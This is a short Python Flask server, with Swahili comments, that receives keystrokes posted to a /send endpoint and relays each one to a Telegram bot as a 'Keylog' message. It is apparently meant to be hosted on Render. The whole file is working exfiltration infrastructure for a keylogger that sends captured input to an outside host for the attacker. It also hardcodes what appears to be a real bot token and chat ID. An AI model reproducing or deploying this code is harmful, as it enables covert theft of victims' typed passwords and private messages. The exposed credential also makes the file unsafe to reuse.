
from flask import Flask, request
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "8246860772:AAF8iybKlcwUQdeSAv4s0tJurejRHcbAKhY"  # 👈 weka token yako hapa
CHAT_ID = "8303486983"      # 👈 weka chat ID hapa

@app.route("/send", methods=["POST"])
def send_to_telegram():
    data = request.get_json()
    key = data.get("key")

    if key:
        message = f"🖥️ Keylog: {key}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message
        }
        requests.post(url, data=payload)

    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # 👈 PORT kwa ajili ya Render
    app.run(host="0.0.0.0", port=port)